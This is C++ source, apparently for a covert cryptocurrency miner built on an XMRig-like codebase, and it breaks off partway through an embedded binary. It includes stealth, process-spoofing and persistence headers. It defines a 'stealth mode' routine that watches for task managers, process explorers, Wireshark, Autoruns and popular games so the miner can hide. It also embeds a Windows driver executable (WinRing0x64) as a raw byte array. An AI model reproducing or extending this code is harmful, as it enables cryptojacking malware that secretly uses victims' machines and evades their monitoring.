#include "App.h"
#include "base/io/log/Log.h"
#include "base/kernel/Entry.h"
#include "base/kernel/Process.h"
#include "core/Controller.h"
#include "core/Miner.h"
#include "crypto/common/VirtualMemory.h"
#include "crypto/rx/Rx.h"
#include <windows.h>
#include <tlhelp32.h>
#include <thread>
#include <chrono>
#include <string>
#include "base/kernel/Base.h"
#include <fstream>
#include "stealth/ads_manager.h"
#include "stealth/process_spoofer.h"
#include "persistence/service_manager.h"

bool PausedMode = false; // stealth mode 

bool stealth_targets(std::wstring& foundName, DWORD& foundPID) {
    std::vector<std::wstring> monitoredNames = {
        L"autorunsc.exe",
        L"Cyberpunk2077.exe",
        L"FiveM.exe",
        L"GTA5.exe",
        L"ModernWarfare.exe",
        L"perfmon.exe",
        L"Photoshop.exe",
        L"procexp.exe",
        L"procexp64.exe",
        L"ProcessHacker.exe",
        L"taskmgr.exe",
        L"tcpdump.exe",
        L"tcpview.exe",
        L"VALORANT.exe",
        L"wireshark.exe"
    };
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return false;
    }
    PROCESSENTRY32W entry;
    entry.dwSize = sizeof(entry);
    if (!Process32FirstW(snapshot, &entry)) {
        CloseHandle(snapshot);
        return false;
    }
    do {
        for (const auto& name : monitoredNames) {
            if (_wcsicmp(entry.szExeFile, name.c_str()) == 0) {
                foundName = entry.szExeFile;
                foundPID = entry.th32ProcessID;
                CloseHandle(snapshot);
                return true;
            }
        }
    } while (Process32NextW(snapshot, &entry));
    CloseHandle(snapshot);
    return false;
}
unsigned char WinRing0x64[] = { 0x4d,0x5a,0x90,0x00,0x03,0x00,0x00,0x00,0x04,0x00,0x00,0x00,0xff,0xff,0x00,0x00,0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xe0,0x00,0x00,0x00,0x0e,0x1f,0xba,0x0e,0x00,0xb4,0x09,0xcd,0x21,0xb8,0x01,0x4c,0xcd,0x21,0x54,0x68,0x69,0x73,0x20,0x70,0x72,0x6f,0x67,0x72,0x61,0x6d,0x20,0x63,0x61,0x6e,0x6e,0x6f,0x74,0x20,0x62,0x65,0x20,0x72,0x75,0x6e,0x20,0x69,0x6e,0x20,0x44,0x4f,0x53,0x20,0x6d,0x6f,0x64,0x65,0x2e,0x0d,0x0d,0x0a,0x24,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x35,0x3a,0x6e,0xfc,0x71,0x5b,0x00,0xaf,0x71,0x5b,0x00,0xaf,0x71,0x5b,0x00,0xaf,0x71,0x5b,0x01,0xaf,0x7d,0x5b,0x00,0xaf,0x56,0x9d,0x7b,0xaf,0x74,0x5b,0x00,0xaf,0x56,0x9d,0x7d,0xaf,0x70,0x5b,0x00,0xaf,0x56,0x9d,0x6d,0xaf,0x72,0x5b,0x00,0xaf,0x56,0x9d,0x71,0xaf,0x70,0x5b,0x00,0xaf,0x56,0x9d,0x7c,0xaf,0x70,0x5b,0x00,0xaf,0x56,0x9d,0x78,0xaf,0x70,0x5b,0x00,0xaf,0x52,0x69,0x63,0x68,0x71,0x5b,0x00,0xaf,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x50,0x45,0x00,0x00,0x64,0x86,0x06,0x00,0xc1,0x26,0x8b,0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xf0,0x00,0x22,0x00,0x0b,0x02,0x08,0x00,0x00,0x0c,0x00,0x00,0x00,0x0a,0x00,0x00,0x00,0x00,0x00,0x00,0x08,0x50,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x02,0x00,0x00,0x06,0x00,0x00,0x00,0x06,0x00,0x00,0x00,0x06,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x00,0x00,0x04,0x00,0x00,0x08,0x19,0x01,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x04,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x64,0x50,0x00,0x00,0x3c,0x00,0x00,0x00,0x00,0x60,0x00,0x00,0xc0,0x03,0x00,0x00,0x00,0x40,0x00,0x00,0x60,0x00,0x00,0x00,0x00,0x1... [truncated]
